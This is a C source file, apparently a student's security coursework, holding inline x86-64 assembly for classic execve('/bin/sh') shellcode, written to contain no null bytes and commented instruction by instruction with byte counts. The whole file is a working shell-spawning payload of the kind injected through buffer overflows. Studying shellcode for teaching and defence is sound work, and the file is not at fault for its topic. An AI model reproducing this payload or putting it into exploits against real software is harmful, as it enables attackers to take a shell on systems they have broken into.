/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>

/**
 * This is the final shellcode which is corrected for appearance of null strings
 * containing execve and exit syscalls code written in at&t syntax.
 */

void main()
{
asm
(
	"jmp .+0x29;"				// 2 bytes	// This jumps to call instr.
	"pop %rbx;"					// 1 byte	// Takes the string address to rbx.
	"mov %rbx, 0x8(%rbx);"		// 4 bytes	// Filling the array with ptr to
											// filename, array starts at 8 bytes
											// after filename starts.
	"xorq %rax, %rax;"			// 3 bytes	// Different way of moving zero to
											// register rax.
	"movb %ah, 0x7(%rbx);"		// 3 bytes	// Moving zero into end of filename
											// to make it a string ending with
											// null byte.
	"movq %rax, 0x10(%rbx);"	// 4 bytes	// Moving NULL to second element of
											// array as there are no flags along
											// with filename.
	"mov %eax, %edx;"			// 2 bytes	// Moving NULL to edx since no
											// environment variables.
	"movb $0x3b, %al;"			// 2 bytes	// Moving execve number to lower
											// part of rax reg avoiding
											// redundant 0s & reduce instr size.
	"mov 0x8(%rbx), %rdi;"		// 4 bytes	// moving string address to rdi.
	"lea 0x8(%rbx), %rsi;"		// 4 bytes	// moving array address to rsi.
	"syscall;"					// 2 bytes	// calling syscall.
	"xorq %rcx, %rcx;"			// 3 bytes	// zero to rcx register
	"mov %rcx, %rdi;"			// 3 bytes	// exit status to rdi.
	"movb $0x3c, %al;"			// 2 bytes	// exit syscall number to rax.
	"syscall;"					// 2 bytes	// calling syscall
	"call .-0x27;"				// 5 bytes	// jumps to 2nd instr pushing the
											// string address.
	".string \"/bin/sh                 \";"	// After the filename observe that
											// 17 spaces are left one for ending
											// the string and 2 bytes for the
											// arguments array construction.
);
}
